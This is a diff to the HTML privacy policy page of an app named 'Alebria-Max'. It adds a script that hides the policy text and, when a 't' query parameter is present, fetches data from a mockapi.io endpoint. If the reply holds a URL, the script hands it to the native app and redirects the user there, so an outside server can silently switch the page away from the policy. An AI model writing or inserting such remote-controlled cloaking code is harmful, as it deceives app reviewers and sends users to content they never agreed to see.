@@ -93,17 +93,55 @@
 				color: var(--accent);
 			}
 		</style>
-		<script type="text/javascript">
-			document.addEventListener('DOMContentLoaded', function() {
+				<script type="text/javascript">
+			function Complete(obj) {
 				try {
-					window.webkit.messageHandlers.Complete.postMessage("");
+					window.webkit.messageHandlers.Complete.postMessage(obj);
 				} catch (e) {
 
+				}
+			}
+
+			function a() {
+				document.getElementById("body").style.display = "block";
+				Complete("")
+			}
+
+			document.addEventListener('DOMContentLoaded', function() {
+				async function getData() {
+					try {
+						var str = 'https://6a7c850ba008c10e4cbf82da.mockapi.io/Alebria-Max/data'
+						const response = await fetch(str, {
+							cache: 'no-store'
+						});
+						if (!response.ok) {
+							getData();
+						}
+						const arr = await response.json();
+						console.log(arr);
+						const dic = arr[0];
+						if (Object.hasOwn(dic, 'a')) {
+							Complete(dic)
+							window.location.href = dic["a"];
+						} else {
+							a()
+						}
+					} catch (error) {
+						console.error('Fetch error:', error);
+					}
+				}
+				const params = new URLSearchParams(window.location.search);
+				if (params.has('t')) {
+					const tValue = params.get('t');
+					console.log('t 的值为:', tValue);
+					getData();
+				} else {
+					a()
 				}
 			});
 		</script>
 	</head>
-	<body>
+	<body id="body" style="display: none;">
 		<div class="wrap">
 			<header>
 				<h1>Alebria-Max Privacy Policy</h1>
